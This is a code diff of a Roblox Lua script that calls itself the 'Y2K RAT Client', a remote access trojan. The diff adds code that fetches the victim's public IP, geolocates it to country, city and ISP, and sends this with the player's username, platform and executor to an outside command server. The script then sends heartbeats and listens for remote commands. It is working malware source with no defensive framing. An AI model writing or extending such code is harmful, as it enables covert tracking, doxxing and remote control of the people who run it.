@@ -1,4 +1,3 @@
-
 local SERVER_URL = "https://robloxlol-production.up.railway.app"
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -6,14 +5,39 @@ local LocalPlayer = Players.LocalPlayer
 local RunService = game:GetService("RunService")
 
 local function getIPInfo()
-    local success, result = pcall(function()
+    local ip = "Hidden"
+    local country = "Unknown"
+    local city = "Unknown"
+    local isp = "Unknown"
+    
+    -- Essayer d'obtenir l'IP via ipify
+    local success1, result1 = pcall(function()
         return game:HttpGet("https://api.ipify.org?format=json")
     end)
-    if success then
-        local data = HttpService:JSONDecode(result)
-        return data.ip or "Hidden"
+    if success1 then
+        local data = HttpService:JSONDecode(result1)
+        ip = data.ip or "Hidden"
     end
-    return "Hidden"
+    
+    -- Essayer d'obtenir plus d'infos via ip-api.com
+    if ip ~= "Hidden" then
+        local success2, result2 = pcall(function()
+            return game:HttpGet("http://ip-api.com/json/" .. ip)
+        end)
+        if success2 then
+            local geoData = HttpService:JSONDecode(result2)
+            country = geoData.country or "Unknown"
+            city = geoData.city or "Unknown"
+            isp = geoData.isp or "Unknown"
+        end
+    end
+    
+    return {
+        ip = ip,
+        country = country,
+        city = city,
+        isp = isp
+    }
 end
 
 local function getExecutorName()
@@ -30,6 +54,8 @@ local function getPlayerInfo()
     pcall(function()
         gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
     end)
+    
+    local ipInfo = getIPInfo()
    
     return {
         username = player.Name,
@@ -43,7 +69,10 @@ local function getPlayerInfo()
         platform = tostring(game:GetService("UserInputService"):GetPlatform()),
         executor = getExecutorName(),
         timestamp = os.date("%d/%m/%Y %H:%M:%S"),
-        ip = getIPInfo(),
+        ip = ipInfo.ip,
+        country = ipInfo.country,
+        city = ipInfo.city,
+        isp = ipInfo.isp,
         status = "online"
     }
 end
@@ -262,9 +291,12 @@ local function listenForCommands()
 end
 
 -- Main execution
+print("🚀 Y2K RAT Client - Initializing...")
 local playerInfo = getPlayerInfo()
+print("📡 Connecting to server...")
+print("🌐 IP:", playerInfo.ip)
+print("📍 Location:", playerInfo.city, playerInfo.country)
 sendToServer(playerInfo)
+print("✅ Connected successfully!")
 startHeartbeat()
 listenForCommands()
-
-
